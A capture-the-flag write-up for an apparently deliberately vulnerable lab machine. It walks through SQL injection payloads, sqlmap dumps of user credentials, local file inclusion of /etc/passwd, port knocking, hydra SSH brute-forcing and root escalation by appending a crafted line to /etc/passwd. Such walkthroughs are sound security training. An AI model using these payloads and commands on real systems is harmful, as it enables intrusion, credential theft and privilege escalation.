> from machine side 
> 
![Pasted image 20210910075434](https://user-images.githubusercontent.com/67979878/132948800-916935d6-be27-443b-abf4-d6fab6e066b5.png)

# Discovery :

## scanning :

- scan network to get ip of the machine 
`$ nmap 192.168.1.1/24 -oN nmap/all_network  `

seems the one :

![Pasted image 20210910055029](https://user-images.githubusercontent.com/67979878/132948808-a507d231-0a7f-4ce3-b2da-5f66afe6f383.png)

then ip : 192.168.1.7
### scan the machine
>intial :

$ nmap -sV -sC -v 192.168.1.7 -oN nmap/DC_intial

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Example.com - Staff Details - Welcome

```

![Pasted image 20210910055314](https://user-images.githubusercontent.com/67979878/132948818-8cfccaf5-e2f6-494c-a237-63a2850938ec.png)

>all :

$ nmap -p-  192.168.1.7 -oN nmap/DC_all

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-09 23:52 EDT
Nmap scan report for 192.168.1.7
Host is up (0.00024s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE

```

we only have this box can take input so let's try SQL injection

![Pasted image 20210910055516](https://user-images.githubusercontent.com/67979878/132948829-5e9fc002-1ec3-4eb2-b39d-c6b36b1e05dd.png)

seems injectable 

![Pasted image 20210910055615](https://user-images.githubusercontent.com/67979878/132948840-7a251196-286b-43f1-95ca-07b6f949fd7e.png)
let's enumerate the following :

```
1- how many columns in the other side
2- tables names
3- columns names of table we are interested in 
```
# SQL injection :

## manually : 

>[1] : How many columns ?

- it seems to be MySQL database . 

- we have 2 ways to enumerate the columns on the other side of query 
 
1- with `order by`

payload :

```
valid' order by n-- -
where n starts from 1,2,3,4,5,6,7,. . .
should return error if n > columns 
```

trying `mary' order by 4-- -`

![Pasted image 20210910061222](https://user-images.githubusercontent.com/67979878/132948915-fa815f3a-d9a8-4f5c-8865-8e8d84180bb1.png)

trying `mary' order by 7-- -`

![Pasted image 20210910061235](https://user-images.githubusercontent.com/67979878/132948919-7b4fe2e3-54c1-488f-8a3f-d701e4f212dc.png)

so  7>n>4  after trying it is =6 

2- with `NULL`

like :

`junk'UNION SELECT @@version,NULL,NULL-- -`  X error

`junk'UNION SELECT @@version,NULL,NULL,NULL-- -` X error

`junk'UNION SELECT @@version,NULL,NULL,NULL,NULL-- -` X error

`junk'UNION SELECT @@version,NULL,NULL,NULL,NULL,NULL-- -` OK


> [2]: what tables do we have ? 

```sql
junk'UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables-- -
```
 there are alot  but i will focus on : 
 
 [+]tables : Users, UserDetails, USER_PRIVILEGES

![Pasted image 20210910061708](https://user-images.githubusercontent.com/67979878/132948933-543e0370-d6c4-4556-90b8-f94d3f9d869d.png)

> [3]: what are columns names so we can get data from tables ?

`junk'UNION SELECT column_name,NULL,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='Users'-- -`

![Pasted image 20210910061843](https://user-images.githubusercontent.com/67979878/132948942-d615045a-1236-40c7-b696-eb047e0e0840.png)

[+] columns : UserID,Username,Password

> [4] : get what do you want :

`junk'UNION SELECT UserID,Username,Password,NULL,NULL,NULL from Users -- -`

![Pasted image 20210910061959](https://user-images.githubusercontent.com/67979878/132948953-2be3d3bb-0726-41c5-8340-a448c85988af.png)

crack the hash : 

[+] Name: admin 856f5de590ef37314e7c3bdf6f8a66dc: transorbital1

## sqlmap

> [1] get all tables names

```bash
$ sqlmap -u " http://192.168.1.7/results.php " --method POST --data="search=" -p search --dbms=mysql --tables                     
```
![Pasted image 20210910064512](https://user-images.githubusercontent.com/67979878/132948995-4d4fbce0-9fed-450b-a7f8-9b8fce666550.png)


we have other databases rather than information.schema 

> [2] get table users and dump content 

```bash
$ sqlmap -u " http://192.168.1.7/results.php " --method POST --data="search=" -p search --dbms=mysql -T Users --dump 
```
![Pasted image 20210910063802](https://user-images.githubusercontent.com/67979878/132948989-53759237-ab11-4e56-a4a7-5d4e40c0b745.png)


> [new] enumerate new databases :

```bash
$ sqlmap -u " http://192.168.1.7/results.php " --method POST --data="search=" -p search --dbms=mysql -D users -T UserDetails --dump  
```

results :
```
+----+------------+---------------+---------------------+-----------+-----------+
| id | lastname   | password      | reg_date            | username  | firstname |
+----+------------+---------------+---------------------+-----------+-----------+
| 1  | Moe        | 3kfs86sfd     | 2019-12-29 16:58:26 | marym     | Mary      |
| 2  | Dooley     | 468sfdfsd2    | 2019-12-29 16:58:26 | julied    | Julie     |
| 3  | Flintstone | 4sfd87sfd1    | 2019-12-29 16:58:26 | fredf     | Fred      |
| 4  | Rubble     | RocksOff      | 2019-12-29 16:58:26 | barneyr   | Barney    |
| 5  | Cat        | TC&TheBoyz    | 2019-12-29 16:58:26 | tomc      | Tom       |
| 6  | Mouse      | B8m#48sd      | 2019-12-29 16:58:26 | jerrym    | Jerry     |
| 7  | Flintstone | Pebbles       | 2019-12-29 16:58:26 | wilmaf    | Wilma     |
| 8  | Rubble     | BamBam01      | 2019-12-29 16:58:26 | bettyr    | Betty     |
| 9  | Bing       | UrAG0D!       | 2019-12-29 16:58:26 | chandlerb | Chandler  |
| 10 | Tribbiani  | Passw0rd      | 2019-12-29 16:58:26 | joeyt     | Joey      |
| 11 | Green      | yN72#dsd      | 2019-12-29 16:58:26 | rachelg   | Rachel    |
| 12 | Geller     | ILoveRachel   | 2019-12-29 16:58:26 | rossg     | Ross      |
| 13 | Geller     | 3248dsds7s    | 2019-12-29 16:58:26 | monicag   | Monica    |
| 14 | Buffay     | smellycats    | 2019-12-29 16:58:26 | phoebeb   | Phoebe    |
| 15 | McScoots   | YR3BVxxxw87   | 2019-12-29 16:58:26 | scoots    | Scooter   |
| 16 | Trump      | Ilovepeepee   | 2019-12-29 16:58:26 | janitor   | Donald    |
| 17 | Morrison   | Hawaii-Five-0 | 2019-12-29 16:58:28 | janitor2  | Scott     |
+----+------------+---------------+---------------------+-----------+-----------+


```

other DB 

```bash
$ sqlmap -u " http://192.168.1.7/results.php " --method POST --data="search=" -p search --dbms=mysql -D Staff -T StaffDetails --dump
```

interesting result :

[+]potential username 
```
 Fred      | Systems Administrator  |

```

# exploitation :

when logged in with admin as we 've got the password from database

![Pasted image 20210910065124](https://user-images.githubusercontent.com/67979878/132949063-d58bf3ae-7d99-48a0-b4d0-446ee79299be.png)


> file not exist .. then a file has been requested  

`http://192.168.1.7/manage.php?file=../../../../../../../etc/passwd`

![Pasted image 20210910065445](https://user-images.githubusercontent.com/67979878/132949070-52c6aa87-0f63-4a2d-91f5-f6be35d3a096.png)

so we have LFI try to :

```
- inject php in useragent and execute it by lfi the access.log file
```
failed .


there is another problem that only http is open we need ssh . reading about *port knocking* :

`http://192.168.1.7/manage.php?file=../../../../../../../etc/knockd.conf`

![Pasted image 20210910070850](https://user-images.githubusercontent.com/67979878/132949085-af10178c-1c46-4ce8-9754-b7f6a40bab60.png)

so we have `sequence = 7469,8475,9842 ` , if we knock on these ports we will open the ssh 

![Pasted image 20210910071119](https://user-images.githubusercontent.com/67979878/132949087-101d8681-ce83-4694-9615-eb43f9b00a25.png)

now we can use ssh and login !

`` 4sfd87sfd1    | 2019-12-29 16:58:26 | fredf     | Fred ``

when i try it was a wrong password.

![Pasted image 20210910071618](https://user-images.githubusercontent.com/67979878/132949106-34636182-11dc-4780-af66-85196dc59e6b.png)

removing whitespaces :

![Pasted image 20210910072006](https://user-images.githubusercontent.com/67979878/132949110-48295456-735e-4013-b390-583ff08e7e15.png)

and yes i swapped password and usernames by mistake :D


### Brute-Forcing 

just instead of trying them all :D 

`$ hydra -L usernames -P password_list ssh://192.168.1.7 `

so we have 3 valid ssh users :

```
[22][ssh] host: 192.168.1.7   login: chandlerb   password: UrAG0D!
[22][ssh] host: 192.168.1.7   login: joeyt   password: Passw0rd
[22][ssh] host: 192.168.1.7   login: janitor   password: Ilovepeepee
```

try any :

![Pasted image 20210910072500](https://user-images.githubusercontent.com/67979878/132949131-81511a49-8aa5-4878-85bb-9a05b7c21bd5.png)


# foothold :

![Pasted image 20210910072631](https://user-images.githubusercontent.com/67979878/132949150-e80ea727-f0e2-4edb-9a91-f928b49a2bbb.png)

one of these passwords must be  for sure fredf password :D

### sending files thorough network :

![Pasted image 20210910073230](https://user-images.githubusercontent.com/67979878/132949161-247458f2-c6a3-4189-b3ce-23bfb08f6d48.png)

![Pasted image 20210910073256](https://user-images.githubusercontent.com/67979878/132949167-a73b0c8c-4bb2-47d0-a66f-b439f3d32632.png)


## brute-forcing :

` hydra -l fredf -P passwords-found-on-post-it-notes.txt ssh://192.168.1.7 `

``[22][ssh] host: 192.168.1.7   login: fredf   password: B4-Tru3-001``


![Pasted image 20210910073502](https://user-images.githubusercontent.com/67979878/132949177-d421a273-b601-4ba9-b142-cde4f2dd193d.png)

## privilege escalation possible factors :

![Pasted image 20210910073542](https://user-images.githubusercontent.com/67979878/132949184-75a60fef-30f6-40ab-b6dd-10c09db07706.png)


# privilege escalation :

![Pasted image 20210910073647](https://user-images.githubusercontent.com/67979878/132949203-9d75d769-f85f-410e-a9bc-bd43535fe32a.png)

it will take a file as argument 1 and add it to argument 2 in append mode .
we can write in /etc/passwd and /etc/shadow hence we can run the executable file as root privileged 
 
>  generate new password :

`$ openssl passwd  -1 'i am a hacker mama'`

`1 : md5_hash` 

`$ echo "fake_root:\$1\$A2X51.Kq\$Gk9Rn77C.0yrQLIHAw3Nw/:0:0:root:/root:/bin/bash" > new_user `

> send via network 


![Pasted image 20210910075003](https://user-images.githubusercontent.com/67979878/132949206-5d51c4fe-3b71-40b4-a194-7a010c49c7fd.png)

![Pasted image 20210910075025](https://user-images.githubusercontent.com/67979878/132949226-0a55edd7-f6a4-451a-9f4b-e26c0baf02a8.png)

> exploit !

![Pasted image 20210910075153](https://user-images.githubusercontent.com/67979878/132949265-9ee533ef-d875-4745-86f0-5360a42a07d9.png)

![Pasted image 20210910075224](https://user-images.githubusercontent.com/67979878/132949273-cdf47dcd-6a02-46e1-b024-307931c8b39e.png)

## from the machine :

![Pasted image 20210910075354](https://user-images.githubusercontent.com/67979878/132949277-faf5edb6-2a4c-423f-9d0a-5e0cde47c7b8.png)



# pwned !
